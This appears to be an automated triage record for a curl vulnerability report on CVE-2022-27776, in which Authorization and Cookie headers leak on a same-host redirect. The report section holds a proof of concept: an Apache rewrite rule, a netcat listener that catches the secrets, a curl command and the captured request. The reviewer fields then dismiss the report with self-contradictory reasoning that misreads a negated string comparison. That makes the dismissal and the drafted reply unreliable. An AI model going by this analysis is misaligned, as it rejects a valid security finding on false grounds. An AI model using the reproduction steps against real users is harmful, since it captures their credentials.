title: CVE-2022-27776: Auth/cookie leak on redirect
excerpt:
## Summary:
Curl can be coaxed to leak Authorisation / Cookie headers by redirecting request to http:// URL on the same host. Successful exploitation requires that the attacker can either Man-in-the-Middle the connection or can access the traffic at the recipient side (for example by redirecting to a non-privileged port such as 9999 on the same host).

## Steps To Reproduce:

1. Configure for example Apache2 to perform redirect with mod_rewrite:
   ```
   RewriteCond %{HTTP_USER_AGENT} "^curl/"
   RewriteRule ^/redirectpoc http://hostname.tld:9999 [R=301,L]
    ```
  ... the attacker could also use `.htpasswd` file to do so.
  2. Set up netcat to listen for the incoming secrets:
    `while true; do echo -ne 'HTTP/1.1 404 nope\r\nContent-Length: 0\r\n\r\n' | nc -v -l -p 9999; done`
  3. `curl-L -H "Authorization: secrettoken" -H "Cookie: secretcookie" https://hostname.tld/redirectpoc`
 
The redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:
```
GET / HTTP/1.1
Host: hostname.tld:9999
User-Agent: curl/7.83.0-DEV
Accept: */*
Authorization: secrettoken
Cookie: secretcookie
```

The attack could also use HTTPS and a valid certificate, In this case the leaked headers are of course only be visible to the listening http server.

This vulnerability is quite similar to CVE-2022-27774 and the fix is similar too: If the protocol or port number differs from the original request strip the Authorization and Cookie headers.

This bug appears to be here: https://github.com/curl/curl/blob/master/lib/http.c#L1904

## Impact

Leak of Authorisation and/or Cookie headers.
explain: The real code disproves the report's central claim.
summary: Curl can be coaxed to leak Authorization and Cookie headers by redirecting request to http:// URL on the same host.

claims.text: curl leaks Authorization and Cookie headers when following a redirect to a different protocol or port
claims.reasoning: The code explicitly checks only the host name via strcasecompare. When the host name is the same, the condition evaluates to true and the headers are stripped (the trailing ';' does nothing). The report claims the opposite—that headers are leaked in this scenario—but the provided code shows they are stripped.

citations.note: The condition at lines 1904-1911 strips Authorization/Cookie headers on redirect when data->state.this_is_a_follow is true, first_host exists, allow_auth_to_other_hosts is false, and first_host matches conn->host.name (case-insensitive). This match is based solely on host name; protocol and port are not compared. A redirect to the same host name (e.g., https://hostname.tld → http://hostname.tld:9999) satisfies the condition, causing the headers to be skipped (not sent).

claims.text: The bug is located in lib/http.c at line 1904
claims.reasoning: The cited location correctly contains the relevant header-filtering logic for Authorization and Cookie headers on redirect.

citations.note: The Authorization/Cookie header handling logic is at lines 1904-1912 in the provided source.

claims.text: An attacker can trigger the leak by causing a request with Authorization or Cookie headers to be redirected to an http:// URL on the same host
claims.reasoning: The trigger described (redirect to http:// URL on same host) would cause the host-name comparison to succeed, leading to the headers being stripped per the code at lines 1904-1911.

citations.note: The condition requires data->state.this_is_a_follow (redirect) and data->state.first_host (original host) and !strcasecompare(first_host, conn->host.name) (host name match). In the reported scenario (same host name, different protocol/port), the host name matches, so the condition is true and the headers are not sent.

claims.text: The confidential headers are sent over insecure HTTP to the specified port, exposing them to the attacker
claims.reasoning: The impact claim depends on the leak occurring; the code shows the leak does not occur for same-host-name redirects.

citations.note: Since the headers are stripped when the host name matches (lines 1904-1911), they are not sent over the insecure HTTP connection in the reported scenario.

claims.text: The report provides steps to reproduce using Apache2 mod_rewrite redirect and netcat listener on port 9999
claims.reasoning: The report does provide the described reproduction steps; this claim is factual about the report itself.

citations.note: The report includes concrete reproduction steps with Apache mod_rewrite and netcat. This claim is about the report's content, not code behavior.

key_reasons: The code at lib/http.c:1904-1911 strips Authorization and Cookie headers on redirect when the host name (conn->host.name) matches the original host (data->state.first_host), using a case-insensitive comparison that ignores protocol and port.

A redirect from https://hostname.tld to http://hostname.tld:9999 has the same host name, so the condition !strcasecompare(first_host, conn->host.name) evaluates to true, causing the headers to be skipped (not sent).
The report claims the opposite—that headers are leaked in this scenario—but the provided code contradicts this.

The comment 'be careful of sending this potentially sensitive header to other hosts' suggests the intent was to strip headers for different hosts, but the implemented logic strips for same host. This is a logic inversion bug, but it is not the vulnerability the report describes.
reply: Thank you for the report. The code at lib/http.c:1904-1911 shows that Authorization and Cookie headers are stripped when following a redirect to the same host name (case-insensitive match via strcasecompare), regardless of protocol or port change. In your scenario (https://hostname.tld → http://hostname.tld:9999), the host name matches, so the headers would not be sent. Could you verify against the exact revision (94ac2ca7754f) or provide a debug trace showing the headers being sent? The logic appears inverted relative to the comment (it strips for same host instead of different host), but that would cause a different behavior than the leak you describe.
